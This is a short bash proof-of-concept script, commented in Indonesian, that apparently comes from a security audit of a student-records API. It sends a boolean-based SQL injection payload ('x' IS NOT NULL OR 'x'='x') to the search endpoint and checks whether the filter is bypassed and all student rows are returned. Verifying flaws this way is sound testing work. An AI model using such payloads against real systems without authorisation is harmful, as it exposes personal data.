#!/usr/bin/env bash
# S1 - SQL Injection pada pencarian list mahasiswa (GET /api/mahasiswa?q=)
# Sink: src/models/mahasiswaModel.js listFrom() -> WHERE ('${pola}' IS NULL OR ... ILIKE '${pola}' ...)
# Prasyarat: peran admin.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; AH="Authorization: Bearer $ADMIN_TOKEN"

echo "== Baseline: q=zzz_tidak_ada (seharusnya 0 hasil) =="
curl -s -m 10 -G "$B/api/mahasiswa" --data-urlencode "q=zzz_tidak_ada" -H "$AH"; echo

echo "== Payload boolean-based: q=x' IS NOT NULL OR 'x'='x =="
RESP=$(curl -s -m 10 -G "$B/api/mahasiswa" --data-urlencode "q=x' IS NOT NULL OR 'x'='x" -H "$AH")
echo "$RESP"
N=$(echo "$RESP" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{try{console.log(JSON.parse(d).data.length)}catch(e){console.log(0)}})")

echo
if [ "${N:-0}" -ge 5 ]; then
  echo "KESIMPULAN: TERBUKTI. Filter pencarian dibypass, $N baris dikembalikan (seluruh data mahasiswa) walau kata kunci 'x' tidak cocok dengan sebagian nama."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini ($N baris)."
fi
